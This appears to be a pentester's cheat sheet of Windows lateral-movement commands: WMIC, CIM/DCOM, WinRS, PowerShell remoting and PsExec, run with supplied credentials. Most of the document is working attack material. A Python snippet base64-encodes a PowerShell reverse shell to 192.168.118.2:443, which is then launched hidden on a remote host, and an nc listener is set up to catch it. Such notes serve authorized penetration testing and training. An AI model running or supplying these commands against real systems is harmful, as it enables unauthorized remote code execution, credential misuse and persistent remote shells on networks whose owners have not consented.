#windows
wmic /node:<host> /user:<user> /password:<password> process calll create "<nameprocess>"
#OR
$username = '<username>';
$password = '<passwords>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;

#OR Create A Common Information Model (CIM)
$options = New-CimSessionOption -protocol DCOM
$session = New-CimSession -ComputerName <ip> -Credential $credential -SessionOption $Options
$command = 'calc'

#make togheter all arguments
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -methodName Create -Arguments @{CommandLine = $Command};

#OR get the encodebase64 of your payload
import sys
import base64
payload = '$client = New-Object 
System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + 
base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)

#get the payloads base64 output and after execute the command
$Command = 'powershell -nop -w hidden -e <payload>';
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
#and in remote eve machine open a nc socket
nc -lnvp 443

#OR use winrs but works only for domain users
winrs -r:<host> -u:<user> -p:<password> "cmd /c /hostname & whoami"
#OR with payload
#For WinRS to work, the domain user needs to be part of the Administrators or 
#Remote Management Users group on the target host.
winrs -r:<host> -u:<user> -p:<passowrd> "powershell -nop -w hidden -e <payload>"

#OR user Powershell remoting with PSSession
New-PSSession -ComputerName <host> -Credential $credential
#get session
Enter-PSSession 1

#OR use Psexec -> but the user must be Administrator local group
./PsExec64.exe -i \\<share> -u <domain>\<user> -p <password> cmd


